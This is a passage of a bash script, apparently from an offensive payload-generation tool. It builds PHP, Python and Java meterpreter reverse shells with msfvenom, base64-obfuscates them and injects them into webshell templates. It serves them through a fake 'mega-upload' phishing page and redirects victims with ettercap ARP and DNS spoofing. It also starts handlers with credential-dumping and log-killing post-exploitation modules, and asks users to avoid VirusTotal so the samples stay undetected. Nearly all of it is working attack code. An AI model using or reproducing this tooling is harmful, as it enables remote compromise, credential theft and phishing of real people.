     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
clear
cd $IPATH/



elif [ "$serv" = "php/meterpreter (base64)" ]; then
# ----------------------
# BASE64 ENCODED PAYLOAD
# ----------------------
echo "[☠] Building shellcode -> php format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PHP -> WEBSHELL
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.php
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else

     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear



else



# ------------------------------
# BASE64 MY UNIX APACHE2 EXPLOIT
# ------------------------------
echo "[☠] Building shellcode -> php format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PHP -> APACHE2 (linux)
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


cd $IPATH/templates/
# injecting settings into trigger.sh
echo "[☠] building  -> trigger.sh!"
sleep 2
sed "s|InJ3C|$N4m.php|g" trigger.sh > trigger.raw
sed "s|Lh0St|$lhost|g" trigger.raw > trigger2.raw
mv trigger2.raw $IPATH/output/trigger.sh
chmod +x $IPATH/output/trigger.sh > /dev/null 2>&1
rm trigger.raw > /dev/null 2>&1


# injecting shellcode into name.php
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# edit files nedded
cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|trigger.sh|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
# copy from output
cd $IPATH/output
cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
cp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear
cd $IPATH/
fi
}





# -----------------------------------------------------------------
# build shellcode in PYTHON (multi OS)
# just because ive liked the python payload from veil i decided
# to make another one to all operative systems (python/meterpreter)
# P.S. python outputs in venom uses (windows/meterpreter) ;)
# -----------------------------------------------------------------
sh_shellcode17 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1

echo "[☠] Building shellcode -> python language..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PYTHON -> MULTI OS
|_PAYLOAD : python/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/chars.raw"
st0r3=`cat $IPATH/output/chars.raw`
disp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d ')' -f1`

# display shellcode
# cat $IPATH/output/chars.raw
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc9 $IPATH/templates/exec0[bak].py
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc9 ]; then
      echo "[☠] exec0.py -> found!"
      sleep 2
 
   else

      echo "[☠] exec0.py -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



# injecting shellcode into name.py
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.py!"
sleep 2
echo "[☠] Make it executable..."
sleep 2
sed "s|InJEc|$disp|g" exec0.py > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py
cUe=`echo $N4m.py | cut -d '.' -f1`


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nExecute: python $N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 360) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



if [ "$P0" = "post_linux.rc" ]; then
# store metasploit post exploit directory structure
CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ------------------------------------------------------
# drive-by attack vector JAVA payload.jar
# i have allways dream about this (drive-by-rce)
# using JAVA (affects all operative systems with python)
# -------------------------------------------------------
sh_shellcode18 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1



# CHOSE WHAT PAYLOAD TO USE
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "java/meterpreter/reverse_tcp (default)" FALSE "windows/meterpreter/reverse_tcp (base64)" --width 380 --height 200) > /dev/null 2>&1


if [ "$serv" = "java/meterpreter/reverse_tcp (default)" ]; then
echo "[☠] Building shellcode -> java format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : JAVA -> MULTI OS
|_PAYLOAD : java/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m.jar"
# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2

# CHOSE HOW TO DELIVER YOUR PAYLOAD
